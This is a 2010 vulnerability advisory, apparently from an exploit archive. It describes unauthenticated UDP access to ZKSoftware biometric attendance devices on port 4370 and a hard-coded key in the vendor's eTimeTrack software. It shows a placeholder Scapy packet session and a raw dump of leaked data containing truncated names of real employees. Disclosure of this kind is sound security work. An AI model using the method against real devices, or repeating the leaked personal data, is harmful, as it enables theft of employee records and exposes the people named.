@@ -1,0 +1,66 @@
+# Exploit Title: ZKSoftware Biometric Attendence managnmnet Hardware[MIPS] Improper Authentication.
+# Date: 20-3-2010
+# Author: FB1H2S
+# Software Link: http://www.esslindia.com/install/eTimeTrack.zip
+# Version: V2
+# Tested on: 
+# category: Remote
+# Code : Advisory
+
+###################################################################################
+ZKSoftware Biometric Attendence management Hardware[MIPS] Improper Authentication.
+
+1) ZKSoftware is biometric System which uses Biometric (Fingerprints) to authenticate and manage employee details,and to organise the attendance register. 
+This system is widely used in many countries, but is marketed by different company depending on the country.
+
+ZKsoftwares IP-based attendance management system with the following series "ZK5000-ZK9000", the system allows remote IP based management of the hardware via UDP protocol,
+ but with out any proper authentication.
+
+You could custom create commands and send to UDP port 4370 of the hardwrae and download information from the system, alternatively u could download a copy of there 
+remote hardware management software from one of there vendors web site and use it steel data from the hardware.
+
+Essl is the company which markets this product in India, and its website provides a free download of the management software.
+
+2) Etimetrack software which is used to manage hardware market by ESSL uses an encryption and the encryption key is hard coded in the program.
+
+Exploiting the issue Using Scapy
+
+
+Response from a coustom made scapy packets:-
+#####################################################################################################
+fb1h2s@fb1h2s:~$ sudo scapy
+[sudo] password for adminuser:
+/var/lib/python-support/python2.5/scapy.py:3118: Warning: 'with' will become a reserved keyword in Python 2.6
+/var/lib/python-support/python2.5/scapy.py:3120: Warning: 'with' will become a reserved keyword in Python 2.6
+INFO: Can't import PyX. Won't be able to use psdump() or pdfdump()
+Welcome to Scapy (v1.1.1 / -)
+>>>ip=IP("192.168.*.*)
+>>>udp=UDP(sport=4371,dport=4370)
+>>>payload="Coustomcommands"
+>>packet=ip/udp/payload
+>>> sniff
+<function sniff at 0x9f0333c>
+>>sr1(packet)
+Begin emission:
+Finished to send 1 packets.
+You could possibly get any thing you want from the system
+BINGO :D
+
+I am including a dump of the UDP communication with the hardware, and the data leakage as a reason of improper authentication.
+
+...........Q[...L.WU[.....f.[...Ver 6.21 Sep  4 2008.....[...~OS.....[...~OS=1...hv[...~ExtendFmt...f>[...~ExtendFmt=0...jW[...ExtendOPLog.....[...ExtendOPLog=...X.[...~Platform.....[...~Platform=ZEM500.E..Y[...H....Q[...... .[...WorkCode....r[...WorkCode=0....E[.................F[..............3....D[..............@[.............U.........d......
+MMr.K.Sug........d...e......MMr. Sant.)......e...f......MMrs. Anu/@......f...g......MMr. Kris@@......g...h......MMr. Domian......h...i......MMrs. Sho`n......i...j......MMr. B. S~)......j...k......MMs. Bhag_n......k...l......MMs. NishYn......l...m......MMr. Moha.)......m...n......
+MMr. ChanXn......n...o......MMrs. Ruk^n......o...p......MMr. Prad.g......p...q......MMr. Kuma\n......q...r......MMr. Dhan[n......r...s......MMr. NirmZn......s...t......MMs. Lali1@......t...u......MMs. Nave.)......u...v......MMs. Sudh.)......v...w......
+MMs. Anit2@......w...x......MMs. Poon3@......x...y......MMrs. Gee=@......y...z......MMs. Vidh<@......z...{......MMrs. BanB@......{...|......MMrs. Man]n......|...}......MMr.G.ThiWn......}...~......MMs. Indi........~..........MMrs. Jot...................MMrs. Kav...................
+MMr. Thiy...................MMr. Prak.8.................MMs. Love.8.................MMr. Sund.8.................MMr. Kart.8.................MMs. Koma.8.................MMr. Prad.8.................MMr. ........MaheB`.................MMr. RajkC`.................MMr. NataD`.................MMr. ManoE`.................MMr. Varu<`.................
+MMr. Than@`.................MMr. Rich=`.................MMr. Prak>`.................MMrs.A.Us?`.................MMrs.B.KaA`.................MMs. Banu._.................MMr. Stal.@.................MMr. Chan.@.................MMr. DhanQn.................MMr. MukiRn.................MMrs. Satcn.................MMs. Gomabn.................MMr. Ramadn.................
+MMrs. Geeen.................
+Trimmed....
+
+Current vulnerability is checked and verified with zk5000 hardware model, possibly all other versions would be vulnerable.
+
+#####################################################################################################
+# Greetz to all Darkc0de, Andhra Hackers and ICW Memebers[Indian Cyber Wrriors]                             
+#Thanks  : Mr bond,beenu,Wipu,GOdwinAustin,The_empty,hg_H@x0r,r45c4l,it_security,eberly,harin,manoj
+#Shoutz  : SMART_HAX0R,j4ckh4x0r,41w@r10r,Hackuin
+#Catch us at www.andhrahackers.com or www.teamicw.in 
